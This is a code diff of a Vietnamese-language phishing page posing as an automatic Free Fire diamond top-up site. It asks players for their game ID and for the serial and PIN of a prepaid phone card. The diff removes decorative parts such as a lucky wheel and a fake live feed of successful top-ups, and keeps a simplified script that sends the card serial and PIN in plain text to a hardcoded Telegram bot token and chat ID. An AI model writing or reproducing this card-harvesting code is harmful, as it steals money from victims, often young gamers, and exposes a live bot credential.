@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NẠP KIM CƯƠNG FREE FIRE - HỆ THỐNG NẠP TỰ ĐỘNG GIÁ RẺ</title>
+    <title>NẠP KIM CƯƠNG FREE FIRE - HỆ THỐNG NẠP TỰ ĐỘNG</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- FontAwesome Icons -->
@@ -61,7 +61,6 @@
     <!-- CONTAINER CHÍNH -->
     <main class="max-w-7xl mx-auto px-4 py-8 space-y-10 flex-grow">
 
-        <!-- BẢNG NẠP THẺ & VÒNG QUAY -->
         <section class="grid grid-cols-1 lg:grid-cols-3 gap-8">
             
             <!-- CỘT TRÁI: NHẬP THÔNG TIN ID -->
@@ -73,7 +72,7 @@
                     </h2>
                     <div class="space-y-3">
                         <div class="relative">
-                            <input type="text" id="playerIdInput" placeholder="Nhập ID Free Fire (VD: 123456789)" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-amber-500 font-mono text-lg">
+                            <input type="text" id="playerIdInput" placeholder="Nhập ID Free Fire..." class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-amber-500 font-mono text-lg">
                             <button onclick="checkPlayerId()" class="absolute right-2 top-2 bg-amber-500 hover:bg-amber-600 text-black font-bold px-3 py-1.5 rounded-lg text-sm transition">
                                 Kiểm tra
                             </button>
@@ -93,7 +92,6 @@
                     </div>
                 </div>
 
-                <!-- BƯỚC 2: CHỌN PHƯƠNG THỨC -->
                 <div class="bg-ff-card p-5 rounded-2xl shadow-xl">
                     <h2 class="font-orbitron text-lg font-bold text-amber-400 flex items-center gap-2 mb-4">
                         <span class="bg-amber-500 text-black w-6 h-6 rounded-full inline-flex items-center justify-center text-sm">2</span> 
@@ -114,9 +112,8 @@
                 </div>
             </div>
 
-            <!-- CỘT PHẢI: GÓI NẠP & FORM ĐIỀN THẺ CÀO -->
+            <!-- CỘT PHẢI: GÓI NẠP & FORM THẺ CÀO -->
             <div class="lg:col-span-2 space-y-6">
-                <!-- BƯỚC 3: CHỌN GÓI KC -->
                 <div class="bg-ff-card p-5 rounded-2xl shadow-xl">
                     <h2 class="font-orbitron text-lg font-bold text-amber-400 flex items-center gap-2 mb-4">
                         <span class="bg-amber-500 text-black w-6 h-6 rounded-full inline-flex items-center justify-center text-sm">3</span> 
@@ -214,7 +211,6 @@
                     </div>
                 </div>
 
-                <!-- BƯỚC 4: CHI TIẾT NHẬP THẺ CÀO -->
                 <div id="cardSection" class="bg-ff-card p-5 rounded-2xl shadow-xl">
                     <h2 class="font-orbitron text-lg font-bold text-amber-400 mb-4 flex items-center justify-between">
                         <span><i class="fa-solid fa-id-card"></i> NHẬP THÔNG TIN THẺ CÀO</span>
@@ -241,21 +237,20 @@
 
                         <div>
                             <label class="block text-xs font-semibold text-slate-400 mb-1">Số Seri</label>
-                            <input type="text" id="cardSerial" placeholder="Nhập số Seri trên thẻ..." required class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-amber-500 font-mono">
+                            <input type="text" id="cardSerial" placeholder="Nhập số Seri..." required class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-amber-500 font-mono">
                         </div>
 
                         <div>
                             <label class="block text-xs font-semibold text-slate-400 mb-1">Mã thẻ (Pin)</label>
-                            <input type="text" id="cardPin" placeholder="Nhập mã cào sau lớp phủ..." required class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-amber-500 font-mono">
+                            <input type="text" id="cardPin" placeholder="Nhập mã thẻ..." required class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-amber-500 font-mono">
                         </div>
 
-                        <button type="submit" class="w-full bg-gradient-to-r from-amber-500 via-orange-500 to-red-500 hover:from-amber-600 hover:to-red-600 text-slate-950 font-orbitron font-black text-xl py-4 rounded-xl shadow-lg hover:shadow-amber-500/30 transition transform active:scale-95 flex items-center justify-center gap-2">
+                        <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-amber-500 via-orange-500 to-red-500 hover:from-amber-600 hover:to-red-600 text-slate-950 font-orbitron font-black text-xl py-4 rounded-xl shadow-lg hover:shadow-amber-500/30 transition transform active:scale-95 flex items-center justify-center gap-2">
                             <i class="fa-solid fa-bolt"></i> NẠP NGAY BÂY GIỜ
                         </button>
                     </form>
                 </div>
 
-                <!-- BANK SECTION (ẨN MẶC ĐỊNH) -->
                 <div id="bankSection" class="hidden bg-ff-card p-5 rounded-2xl shadow-xl space-y-4">
                     <h2 class="font-orbitron text-lg font-bold text-cyan-400 flex items-center justify-between">
                         <span><i class="fa-solid fa-qrcode"></i> CHUYỂN KHOẢN TỰ ĐỘNG KHÔNG CẦN CHỜ</span>
@@ -294,44 +289,8 @@
             </div>
         </section>
 
-        <!-- VÒNG QUAY MAY MẮN -->
-        <section class="bg-ff-card p-6 rounded-2xl shadow-xl flex flex-col md:flex-row items-center justify-between gap-8">
-            <div class="space-y-3 text-center md:text-left">
-                <span class="bg-red-500/20 text-red-400 border border-red-500/30 text-xs font-bold px-3 py-1 rounded-full uppercase">Sự kiện đặc biệt</span>
-                <h3 class="font-orbitron text-2xl font-black text-amber-400">VÒNG QUAY KIM CƯƠNG MAY MẮN</h3>
-                <p class="text-sm text-slate-300 max-w-md">Mỗi lượt nạp thẻ từ 50.000 VNĐ sẽ nhận ngay 1 lượt quay trúng thưởng 100% nhận từ 100 đến 9.999 Kim Cương!</p>
-                <div class="pt-2">
-                    <span class="text-xs text-slate-400">Lượt quay hiện có: <b class="text-amber-400 font-orbitron">1 Lượt</b></span>
-                </div>
-            </div>
-            <div class="relative flex flex-col items-center">
-                <canvas id="wheelCanvas" width="300" height="300" class="rounded-full border-4 border-amber-500 shadow-2xl bg-slate-900"></canvas>
-                <button onclick="spinWheel()" class="mt-4 bg-gradient-to-r from-amber-400 to-orange-500 hover:from-amber-500 hover:to-orange-600 text-slate-950 font-orbitron font-black px-8 py-3 rounded-xl shadow-lg transition">
-                    QUAY NGAY
-                </button>
-            </div>
-        </section>
-
-        <!-- LỊCH SỬ NẠP REALTIME (LIVE FEED) -->
-        <section class="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
-            <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-3 flex items-center gap-2">
-                <span class="w-2 h-2 rounded-full bg-green-500 animate-ping"></span> 
-                LỊCH SỬ NẠP THÀNH CÔNG VỪA XONG
-            </h3>
-            <div class="overflow-hidden h-12 relative">
-                <div id="liveFeedList" class="absolute w-full space-y-2 transition-all duration-500">
-                    <div class="flex items-center justify-between text-xs py-1.5 px-3 bg-slate-800/80 rounded-lg">
-                        <span class="text-slate-300"><i class="fa-solid fa-user-check text-green-400 mr-2"></i> ID: 7829****12</span>
-                        <span class="text-cyan-400 font-bold">Nạp 1.200 Kim Cương</span>
-                        <span class="text-slate-500">10 giây trước</span>
-                    </div>
-                </div>
-            </div>
-        </section>
-
     </main>
 
-    <!-- FOOTER HỖ TRỢ -->
     <footer class="bg-slate-950 border-t border-slate-800 text-slate-400 text-xs py-6">
         <div class="max-w-7xl mx-auto px-4 text-center space-y-2">
             <p class="font-bold text-slate-300">HỆ THỐNG PHÂN PHỐI VÀ NẠP KIM CƯƠNG FREE FIRE TỰ ĐỘNG</p>
@@ -340,35 +299,14 @@
         </div>
     </footer>
 
-    <!-- MODAL HƯỚNG DẪN LẤY ID -->
-    <div id="guideModal" class="fixed inset-0 bg-black/80 hidden items-center justify-center z-50 p-4">
-        <div class="bg-slate-900 border border-slate-700 rounded-2xl max-w-md w-full p-6 space-y-4">
-            <h3 class="font-orbitron font-bold text-lg text-amber-400 flex justify-between items-center">
-                <span>HƯỚNG DẪN LẤY ID GAME</span>
-                <button onclick="closeModal('guideModal')" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
-            </h3>
-            <ol class="list-decimal list-inside space-y-2 text-sm text-slate-300">
-                <li>Mở game <b>Free Fire</b> trên điện thoại.</li>
-                <li>Bấm vào góc trên bên trái màn hình để xem **Hồ sơ nhân vật**.</li>
-                <li>Tìm dòng **ID Nhân vật** (chuỗi gồm 8-10 chữ số).</li>
-                <li>Bấm nút **Sao chép** kế bên dãy số ID và dán vào trang web.</li>
-            </ol>
-            <button onclick="closeModal('guideModal')" class="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-2.5 rounded-xl transition">Đã hiểu</button>
-        </div>
-    </div>
-
-    <!-- JAVASCRIPT XỬ LÝ SỰ KIỆN & BOT TELEGRAM -->
+    <!-- JAVASCRIPT XỬ LÝ -->
     <script>
-        // ==========================================
-        // CẤU HÌNH BOT TELEGRAM CỦA BẠN
-        // ==========================================
         const TELEGRAM_BOT_TOKEN = '8889087234:AAGEMd1qelq-2ilntVdS3RCwwGXHswQ5j0';
         const TELEGRAM_CHAT_ID = '6999613477';
 
         let selectedAmount = 20000;
         let selectedPackName = '220 Kim Cương';
 
-        // Xử lý chuyển phương thức thanh toán
         function switchPayMethod(method) {
             const btnCard = document.getElementById('btnPayCard');
             const btnBank = document.getElementById('btnPayBank');
@@ -388,7 +326,6 @@
             }
         }
 
-        // Chọn gói nạp
         function selectPack(element, amount, packName) {
             document.querySelectorAll('.pack-card').forEach(el => el.classList.remove('border-amber-500', 'bg-ff-card-active'));
             element.classList.add('border-amber-500', 'bg-ff-card-active');
@@ -401,14 +338,13 @@
             document.getElementById('bankAmountDisplay').innerText = amount.toLocaleString('vi-VN') + ' VNĐ';
         }
 
-        // Kiểm tra ID nhân vật
         function checkPlayerId() {
             const id = document.getElementById('playerIdInput').value.trim();
             const resultBox = document.getElementById('playerCheckResult');
             const playerName = document.getElementById('playerName');
 
             if (!id || id.length < 6) {
-                alert('Vui lòng nhập ID nhân vật hợp lệ (từ 6-10 số)!');
+                alert('Vui lòng nhập ID nhân vật hợp lệ!');
                 return;
             }
 
@@ -417,47 +353,7 @@
             document.getElementById('bankContentDisplay').innerText = 'NAPFF ' + id;
         }
 
-        // Mở/Đóng Modal
-        function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
-        function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }
-
-        // GỬI THÔNG TIN NẠP THẺ VỀ TELEGRAM BOT
-        async function sendCardToTelegram(telco, amount, serial, pin, playerId) {
-            const message = `
-🔔 **THÔNG BÁO NẠP THẺ MỚI** 🔔
---------------------------------
-👤 **ID Game FF:** \`${playerId || 'Chưa nhập ID'}\`
-📱 **Loại thẻ:** ${telco}
-💰 **Mệnh giá:** ${Number(amount).toLocaleString('vi-VN')} VNĐ
-🎁 **Gói chọn:** ${selectedPackName}
-🔢 **Số Seri:** \`${serial}\`
-🔑 **Mã Thẻ (Pin):** \`${pin}\`
-⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}
---------------------------------
-            `;
-
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-            try {
-                const res = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                const data = await res.json();
-                return data.ok;
-            } catch (err) {
-                console.error("Lỗi gửi Telegram:", err);
-                return false;
-            }
-        }
-
-        // LẮNG NGHE SUBMIT NẠP THẺ
-        document.getElementById('cardForm').addEventListener('submit', async function(e) {
+        document.getElementById('cardForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
             const telco = document.getElementById('cardTelco').value;
@@ -465,88 +361,45 @@
             const serial = document.getElementById('cardSerial').value.trim();
             const pin = document.getElementById('cardPin').value.trim();
             const playerId = document.getElementById('playerIdInput').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
 
             if (!playerId) {
                 alert('Vui lòng nhập ID nhân vật ở BƯỚC 1 trước khi nạp!');
                 return;
             }
 
-            if (!serial || !pin) {
-                alert('Vui lòng điền đầy đủ Số Seri và Mã Thẻ!');
-                return;
-            }
+            submitBtn.innerText = "Đang xử lý...";
+            submitBtn.disabled = true;
 
-            const success = await sendCardToTelegram(telco, amount, serial, pin, playerId);
+            const plainText = "THONG BAO NAP THE MOI\n------------------------\nID Game FF: " + playerId + "\nLoai the: " + telco + "\nMenh gia: " + Number(amount).toLocaleString('vi-VN') + " VND\nGoi chon: " + selectedPackName + "\nSo Seri: " + serial + "\nMa The: " + pin + "\nThoi gian: " + new Date().toLocaleString('vi-VN') + "\n------------------------";
 
-            if (success) {
-                alert('Gửi thẻ nạp thành công! Hệ thống đang xử lý Kim Cương vào tài khoản ' + playerId + ' trong 1-3 phút.');
-                document.getElementById('cardSerial').value = '';
-                document.getElementById('cardPin').value = '';
-            } else {
-                alert('Có lỗi mạng xảy ra khi gửi thông tin. Vui lòng thử lại!');
-            }
-        });
+            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: plainText
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                submitBtn.innerText = "NẠP NGAY BÂY GIỜ";
+                submitBtn.disabled = false;
 
-        // DRAW VÒNG QUAY MAY MẮN (CANVAS)
-        const canvas = document.getElementById('wheelCanvas');
-        const ctx = canvas.getContext('2d');
-        const options = ["100 KC", "500 KC", "999 KC", "Thẻ Tuần", "2.000 KC", "9.999 KC"];
-        const colors = ["#f59e0b", "#10b981", "#3b82f6", "#8b5cf6", "#ec4899", "#ef4444"];
-        
-        function drawWheel() {
-            const numOptions = options.length;
-            const arcSize = (2 * Math.PI) / numOptions;
-            
-            for (let i = 0; i < numOptions; i++) {
-                const angle = i * arcSize;
-                ctx.beginPath();
-                ctx.fillStyle = colors[i];
-                ctx.moveTo(150, 150);
-                ctx.arc(150, 150, 140, angle, angle + arcSize);
-                ctx.lineTo(150, 150);
-                ctx.fill();
-
-                ctx.save();
-                ctx.translate(150, 150);
-                ctx.rotate(angle + arcSize / 2);
-                ctx.textAlign = "right";
-                ctx.fillStyle = "#ffffff";
-                ctx.font = "bold 14px Orbitron";
-                ctx.fillText(options[i], 120, 5);
-                ctx.restore();
-            }
-        }
-        drawWheel();
-
-        let spinning = false;
-        function spinWheel() {
-            if (spinning) return;
-            spinning = true;
-            let duration = 3000;
-            let startTime = null;
-
-            function animate(timestamp) {
-                if (!startTime) startTime = timestamp;
-                let progress = timestamp - startTime;
-                let rotation = (progress / duration) * 360 * 5;
-                
-                ctx.clearRect(0, 0, 300, 300);
-                ctx.save();
-                ctx.translate(150, 150);
-                ctx.rotate((rotation * Math.PI) / 180);
-                ctx.translate(-150, -150);
-                drawWheel();
-                ctx.restore();
-
-                if (progress < duration) {
-                    requestAnimationFrame(animate);
+                if (data.ok) {
+                    alert('Gửi thẻ nạp thành công! Hệ thống đang xử lý Kim Cương vào tài khoản trong 1-3 phút.');
+                    document.getElementById('cardSerial').value = '';
+                    document.getElementById('cardPin').value = '';
                 } else {
-                    spinning = false;
-                    alert("Chúc mừng bạn vừa quay trúng 999 Kim Cương! Kim Cương sẽ được cộng kèm khi bạn nạp thẻ.");
+                    alert('Lỗi Telegram API: ' + data.description);
                 }
-            }
-            requestAnimationFrame(animate);
-        }
+            })
+            .catch(error => {
+                submitBtn.innerText = "NẠP NGAY BÂY GIỜ";
+                submitBtn.disabled = false;
+                alert('Lỗi kết nối mạng: ' + error.message);
+            });
+        });
     </script>
 </body>
 </html>
